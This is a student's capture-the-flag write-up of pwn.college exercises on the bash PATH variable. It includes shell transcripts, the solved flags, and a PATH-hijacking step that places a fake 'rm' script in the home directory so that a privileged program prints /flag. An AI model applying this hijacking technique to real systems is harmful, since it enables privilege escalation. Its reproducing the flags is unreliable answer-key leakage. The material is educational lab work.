# Pondering Paths

## The path variable

### Solve
**Flag:** `pwn.college{EtYlXJGvv0tz9l4S6ic-0gxatsK.QX2cDM1wSM1EzNzEzW}`

In this we set the PATH variable such that it uses the cat function to chow the flag it has.

```bash
hacker@path~the-path-variable:~$ PATH="cat /flag"
hacker@path~the-path-variable:~$ /challenge/run
Trying to remove /flag...
/challenge/run: line 4: rm: command not found
The flag is still there! I might as well give it to you!
pwn.college{EtYlXJGvv0tz9l4S6ic-0gxatsK.QX2cDM1wSM1EzNzEzW}
```

### New Learnings
i learnt how the bash works on finding the predefined commands.
### References 
-NA-


## Setting Path

### Solve
**Flag:** `pwn.college{ge0sVRMhO0D-L26OFAOFITNiZT7.QX1cjM1wSM1EzNzEzW}`

For this challenge i just had to replace the PATH variable with the given path of the file and run the command to obtain the file.

```bash
hacker@path~setting-path:~$ PATH="/challenge/more_commands/"
hacker@path~setting-path:~$ /challenge/run
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{ge0sVRMhO0D-L26OFAOFITNiZT7.QX1cjM1wSM1EzNzEzW}
```

### New Learnings
-NA-
### References 
-NA-


## Finding path

### Solve
**Flag:** `pwn.college{0TP_xwzh1L085Sa6uARLYsG6L-3.01NzEzNxwSM1EzNzEzW}`

For this i first had to identify the paths in which the win command is present then use that path and print the flag.

```bash
hacker@path~finding-commands:~$ which win
/challenge/paths/29462/win
hacker@path~finding-commands:~$ cat /challenge/paths/29462/flag
pwn.college{0TP_xwzh1L085Sa6uARLYsG6L-3.01NzEzNxwSM1EzNzEzW}
```

### New Learnings
Learnt abouth the which command wich helps you to identify the path of the command.
### References 
-NA-


## Adding commands

### Solve
**Flag:** `pwn.college{QZdvTVpGjHFctO0z023UnJ_BjAs.QX2cjM1wSM1EzNzEzW}`

For this challenge I first identified the absolute path of the cat function then made a new shell scripted file and defined the cat' path with the flag file and gave the PATH variavle path of home as the /challenge/run function act as the root and then ran the command to obtain the flag.

```bash
hacker@path~adding-commands:~$ which cat
/run/dojo/bin/cat
hacker@path~adding-commands:~$ echo '#!/bin/bash' > ~/win
hacker@path~adding-commands:~$ echo '/run/dojo/bin/cat /flag' >> ~/win
hacker@path~adding-commands:~$ chmod a+x ~/win
hacker@path~adding-commands:~$ export PATH="~"
hacker@path~adding-commands:~$ /challenge/run
Invoking 'win'....
pwn.college{QZdvTVpGjHFctO0z023UnJ_BjAs.QX2cjM1wSM1EzNzEzW}
```

### New Learnings
I learnt how to add self made command so that it can be executed by only name.
### References 
-NA-


## Hijacking Commands

### Solve
**Flag:** `pwn.college{omoybgG6KmWJT-UM12Lt7JdzozI.QX3cjM1wSM1EzNzEzW}`

To complete this challenge i had to first create a shell file with the same name as "rm" command so that the /challenge/run command finds the rm command and prints the flag. Then in the file I found out the absolute path of the cat command and then used that path and entered the command to open the "/flag" file in the shell scripted file, then I chenged the PATH variable to the home directory and because i created the shell scripted file in the home directory so that the /challenge/run file can get the "rm" file in the home directory and run the file which inturn will run the cat command and give me the flag.

```bash
hacker@path~hijacking-commands:~$ echo '#!/bin/bash' > ~/rm
hacker@path~hijacking-commands:~$ which cat
/run/dojo/bin/cat
hacker@path~hijacking-commands:~$
hacker@path~hijacking-commands:~$ echo '/run/dojo/bin/cat /flag' >> ~/rm
hacker@path~hijacking-commands:~$ chmod a+x ~/rm
hacker@path~hijacking-commands:~$ PATH="~"
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{omoybgG6KmWJT-UM12Lt7JdzozI.QX3cjM1wSM1EzNzEzW}
```

### New Learnings
-NA-
### References 
https://stackoverflow.com/questions/41358018/how-to-set-path-only-in-bash-script-temporarily \
https://www.cyberciti.biz/faq/unix-linux-adding-path/

